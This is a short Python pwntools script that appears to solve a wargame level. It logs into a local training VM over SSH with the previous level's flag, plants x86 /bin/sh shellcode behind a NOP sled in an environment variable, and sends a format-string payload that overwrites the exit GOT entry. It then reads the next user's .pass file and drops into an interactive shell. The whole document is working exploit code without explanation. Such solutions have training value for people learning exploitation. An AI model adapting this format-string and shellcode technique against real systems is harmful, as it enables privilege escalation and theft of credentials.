#!/usr/bin/env python

from pwn import *
import os

cwd = os.getcwd()
host = "127.0.0.1"
port = 4242

login = "level05"
binary = login
password = open(cwd + "/level04/flag", "r").read().splitlines()[0]
remotebinary = "/home/users/%s/%s" % (login, binary)

target_login = "level06"

shell = ssh(host=host, port=port, user=login, password=password)


shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0"  \
            "\x88\x46\x07\x89\x46\x0c\xb0\x0b"  \
            "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"  \
            "\xcd\x80\x31\xdb\x89\xd8\x40\xcd"  \
            "\x80\xe8\xdc\xff\xff\xff/bin/sh"
env_payload = ("\x90" * 1000) + shellcode


exit_goat_addr_1 = p32(0x080497e0)
exit_goat_addr_2 = p32(0x080497e2)

payload = exit_goat_addr_1 + exit_goat_addr_2 + "%56401d" + "%10$hn" + "%9126d" + "%11$hn"

p = shell.process([remotebinary], env={'PAYLOAD': env_payload})
p.sendline(payload)
p.clean()
p.sendline("whoami")
p.sendline("cat ~%s/.pass" % target_login)
p.interactive()